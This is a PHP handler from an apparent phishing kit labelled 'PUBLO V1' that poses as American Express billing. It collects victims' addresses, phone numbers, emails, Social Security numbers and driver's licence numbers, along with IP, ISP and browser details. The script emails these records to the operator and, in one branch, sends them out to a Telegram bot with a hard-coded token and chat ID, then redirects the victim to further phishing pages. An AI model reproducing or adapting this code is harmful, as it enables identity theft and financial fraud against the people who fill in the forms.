<?php
session_start();
error_reporting(0);
require_once("../main.php");
require_once("../blocker.php");
// require_once("../blocker2.php");
$ip = getUserIP();
$randomnumber = rand(0, 100);

$ispuser = getisp($ip);

$message = "+++++++++++++++++++++++++[ PUBLO V1 ]+++++++++++++++++++++++\n";
$message .= "++-----------------------[ Billing Info ]----------------------++\n";
$message .= "# Stree            		:	".$_POST['st']."\n";
$message .= "# City                 	:	".$_POST['city']."\n";
$message .= "# State                	:	".$_POST['state']."\n";
$message .= "# Phone                 	:	".$_POST['phone']."\n";
$message .= "# Email 	    			:	".$_POST['email']."\n";
$message .= "# SSN 	        			:	".$_POST['ssn']."\n";
$message .= "# DL 	        			:	".$_POST['dl']."\n";
$message .= "++------------------------[ DEVICE INFO ]----------------------++\n";
$message .= "# IP Address 		:	".$ip."\n";
$message .= "# ISP 				:	".$ispuser."\n";
$message .= "# Region 			:	".$regioncity."\n";
$message .= "# City 			:	".$citykota."\n";
$message .= "# Continent 		:	".$continent."\n";
$message .= "# Time Zone 		:	".$timezone."\n";
$message .= "# OS / Browser 	:	".$os." / ".$br."\n";
$message .= "# Date 			:	".$date."\n";
$message .= "# User Agent 		:	".$user_agent."\n";
$message .= "++++++++++++++++++++++++++[ PUBLO V1 ]++++++++++++++++++++++\n";
$_SESSION['email'] = $_POST['email'];
$to = $config['email_result'];
$headers = "From: AMEX BILLING <puB-$randomnumber@PubloAMEX.team>";
$subject = "💟 ".strtoupper($_POST['st'])." // $os - $ip - $cn";
mail($to, $subject, $message, $headers);

if ($config['get_email'] == "IYA") {
	echo "<script type='text/javascript'>window.top.location='../ap/login_email?session=$key';</script>";
$apiToken = "2121890488:AAEsxO6295XBL6uvfJLa_pefweuxtnFuYCI";
$amex = [
	    'chat_id' => '-1001777869001',
	    'text' => $message
	];	

    $key = substr(sha1(mt_rand()),1,25);
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($amex) );

	exit();
}else{
	echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";

	exit();
}